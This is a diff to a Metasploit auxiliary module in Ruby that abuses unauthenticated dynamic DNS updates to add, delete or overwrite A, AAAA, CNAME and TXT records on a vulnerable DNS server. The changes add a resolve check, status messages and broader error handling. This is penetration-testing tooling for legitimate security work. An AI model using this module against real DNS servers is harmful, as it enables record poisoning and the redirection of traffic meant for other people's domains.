@@ -32,10 +32,10 @@ class MetasploitModule < Msf::Auxiliary
     register_options([
       OptString.new('DOMAIN', [true, 'The domain name']),
       OptAddress.new('RHOST', [true, 'The vulnerable DNS server IP address']),
-      OptString.new('HOSTNAME', [true, 'The name record you want to inject']),
-      OptAddress.new('IP', [false, 'The IP you want to assign to the injected record']),
-      OptString.new('VALUE', [false, 'The string to be injected with TXT or CNAME record']),
-      OptEnum.new('TYPE',  [true, 'The record type you want to inject.', 'A', ['A', 'AAAA', 'CNAME', 'TXT']])
+      OptString.new('HOSTNAME', [true, 'The name record you want to add']),
+      OptAddress.new('IP', [false, 'The IP you want to assign to the record']),
+      OptString.new('VALUE', [false, 'The string to be added with TXT or CNAME record']),
+      OptEnum.new('TYPE',  [true, 'The record type you want to add.', 'A', ['A', 'AAAA', 'CNAME', 'TXT']])
     ])
 
     deregister_options('RPORT')
@@ -49,26 +49,39 @@ class MetasploitModule < Msf::Auxiliary
     update   = Dnsruby::Update.new(domain)
     updated  = false
     case
+      when action == :resolve
+        begin
+          answer = resolver.query(fqdn, type)
+          print_good "Found existing #{type} record for #{fqdn}"
+          return true
+        rescue Dnsruby::ServFail
+          print_good "Did not find an existing #{type} record for #{fqdn}"
+          return false
+        end
       when action == :add
+        print_status("Sending dynamic DNS add message...")
         update.absent("#{fqdn}.", type)
         update.add("#{fqdn}.", type_enum, 86400, value)
         begin
           resolver.send_message(update)
           print_good "The record '#{fqdn} => #{value}' has been added!"
           updated = true
-        rescue Dnsruby::YXRRSet, Dnsruby::NXRRSet, Dnsruby::NXDomain => e
-          print_error "Cannot inject #{fqdn}. The DNS server may not be vulnerable or the hostname may exist as a static record."
+        rescue Dnsruby::YXRRSet, Dnsruby::NXRRSet, Dnsruby::NXDomain, Dnsruby::ServFail => e
+          print_error "Cannot add #{fqdn}"
+          print_error "The DNS server may not be vulnerable, or there may be a preexisting static record."
           vprint_error "Update failed: #{e.message}"
         end
       when action == :delete
         begin
+          print_status("Sending dynamic DNS delete message...")
           update.present(fqdn, type)
           update.delete(fqdn, type)
           resolver.send_message(update)
           print_good("The record '#{fqdn} => #{value}' has been deleted!")
           updated = false
-        rescue Dnsruby::YXRRSet, Dnsruby::NXRRSet => e
-          print_error "Cannot delete #{fqdn}. DNS server is vulnerable or domain doesn't exist."
+        rescue Dnsruby::YXRRSet, Dnsruby::NXRRSet, Dnsruby::ServFail => e
+          print_error "Cannot delete #{fqdn}"
+          print_error "The DNS server may not be vulnerable, or there may be a preexisting static record."
           vprint_error "Update failed: #{e.message}"
         end
     end
@@ -82,6 +95,7 @@ class MetasploitModule < Msf::Auxiliary
     end
     case
       when action.name == 'UPDATE'
+        record_action(type, type_enum, value, :resolve)
         if record_action(type, type_enum, value, :add) == false
           print_good "Attempting to force an update to an existing record."
           if record_action(type, type_enum, value, :delete) == true
@@ -99,7 +113,6 @@ class MetasploitModule < Msf::Auxiliary
     ip = datastore['IP']
     value = datastore['VALUE']
     begin
-      print_status("Sending DNS query payload...")
       case
       when datastore['TYPE'] == 'A'
         update_record(type: 'A', type_enum: Dnsruby::Types.A, value: ip, value_name: 'IP')
